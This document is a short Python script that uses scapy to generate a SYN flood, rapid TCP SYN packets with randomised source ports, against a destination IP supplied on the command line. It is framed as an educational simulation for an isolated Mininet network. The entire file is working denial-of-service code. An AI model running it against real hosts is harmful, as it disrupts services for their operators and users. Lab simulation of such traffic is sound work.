#!/usr/bin/env python3
"""
attack_traffic.py
Simulates a SYN flood attack - rapid, high-rate TCP SYN packets.
Run this INSIDE a Mininet host (e.g., via 'mininet> h1 python3 attack_traffic.py <dst_ip>')

NOTE: This is for educational/simulation purposes ONLY, within your own
isolated Mininet virtual network. Never run this against real networks.
"""

import sys
import time
import random
from scapy.all import IP, TCP, send

def generate_attack_traffic(dst_ip, duration=15, rate=100):
    """
    rate = approx packets per second
    """
    print(f"[attack] Simulating SYN flood to {dst_ip} for {duration} seconds at ~{rate} pkt/s...")
    start = time.time()
    count = 0

    while time.time() - start < duration:
        # Randomized source port each time (mimics spoofed/varied attack sources)
        src_port = random.randint(1024, 65535)
        pkt = IP(dst=dst_ip) / TCP(sport=src_port, dport=80, flags="S")
        send(pkt, verbose=0)
        count += 1

        # High rate: very small gap between packets
        time.sleep(1.0 / rate)

    print(f"[attack] Done. Sent {count} packets.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 attack_traffic.py <destination_ip> [duration_seconds] [rate_pps]")
        sys.exit(1)

    dst_ip = sys.argv[1]
    duration = int(sys.argv[2]) if len(sys.argv) > 2 else 15
    rate = int(sys.argv[3]) if len(sys.argv) > 3 else 100

    generate_attack_traffic(dst_ip, duration, rate)
